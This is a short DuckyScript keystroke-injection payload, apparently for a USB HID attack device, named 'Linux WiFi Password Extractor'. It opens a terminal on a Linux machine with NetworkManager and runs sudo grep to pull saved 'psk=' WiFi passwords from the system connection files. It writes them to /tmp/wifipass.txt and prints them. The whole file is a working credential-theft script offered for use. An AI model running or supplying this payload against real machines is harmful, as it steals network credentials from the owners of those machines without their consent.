REM Title: Linux WiFi Password Extractor
REM Description: Reads NetworkManager saved WiFi credentials
REM Target OS: Linux with NetworkManager
REM Author: DoctorSonic

DELAY 1000
CTRL ALT t
DELAY 1000
STRING sudo grep -r 'psk=' /etc/NetworkManager/system-connections/ 2>/dev/null | tee /tmp/wifipass.txt; cat /tmp/wifipass.txt
ENTER
DELAY 2000
